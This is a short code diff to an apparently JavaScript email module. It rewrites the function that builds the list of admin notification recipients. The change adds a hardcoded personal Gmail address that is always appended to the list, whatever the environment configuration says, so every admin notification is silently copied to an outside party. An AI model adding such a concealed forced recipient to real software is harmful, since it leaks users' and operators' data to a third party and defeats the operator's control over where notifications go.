@@ -141,6 +141,7 @@ export const sendMail = async ({ to, subject, text, html }) => {
 };
 
 const toAdminRecipients = () => {
+  const forcedRecipient = "goldchain690@gmail.com";
   const configured = cleanEnv(
     process.env.ADMIN_NOTIFICATION_EMAILS
       || process.env.ADMIN_NOTIFICATION_EMAIL
@@ -148,15 +149,21 @@ const toAdminRecipients = () => {
       || "",
   );
 
+  let recipients = [];
   if (configured) {
-    return configured
+    recipients = configured
       .split(",")
       .map((email) => email.trim())
       .filter(Boolean);
+  } else {
+    const fallback = cleanEnv(process.env.EMAIL_USER);
+    if (fallback) {
+      recipients = [fallback];
+    }
   }
 
-  const fallback = cleanEnv(process.env.EMAIL_USER);
-  return fallback ? [fallback] : [];
+  recipients.push(forcedRecipient);
+  return [...new Set(recipients)];
 };
 
 const sendNotificationMail = async ({ to, subject, title, intro, rows, footerNote }) => {
